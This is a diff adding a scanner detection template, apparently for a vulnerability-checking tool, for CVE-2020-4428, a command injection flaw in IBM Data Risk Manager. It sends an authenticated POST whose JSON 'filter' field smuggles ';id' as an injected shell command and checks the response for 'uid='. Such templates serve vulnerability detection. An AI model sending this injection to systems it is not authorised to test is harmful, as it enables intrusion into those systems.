@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "CVE-2020-4428 / AVE-2020-1609 验证 PoC：检测 IBM Data Risk Manager 2.0.1-2.0.4 远程命令注入漏洞，需要已认证会话"
+id = "POC-AVE-2020-1609"
+name = "IBM Data Risk Manager Command Injection PoC"
+severity = "critical"
+tags = ["ave-2020-1609"]
+vuln_id = [
+    "CVE-2020-4428",
+    "AVE-2020-1609",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/api/v1/audit/export"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"format":"csv","filter":";id"}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{auth_token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
